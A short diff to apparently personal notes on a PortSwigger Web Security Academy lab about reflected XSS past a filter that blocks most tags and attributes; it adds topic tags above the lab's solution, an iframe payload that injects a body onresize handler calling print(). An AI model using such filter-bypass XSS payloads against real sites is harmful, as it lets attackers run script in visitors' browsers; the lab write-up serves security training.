@@ -4,6 +4,8 @@ title: "14 - Reflected XSS into HTML context with most tags and attributes block
 
 # 14 - Reflected XSS into HTML context with most tags and attributes blocked
 
+#xss #reflectedxss #waf #fuzzing #portswigger
+
 ```html
 <iframe src="https://0a9f008204f5b89381d4d524009300ef.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
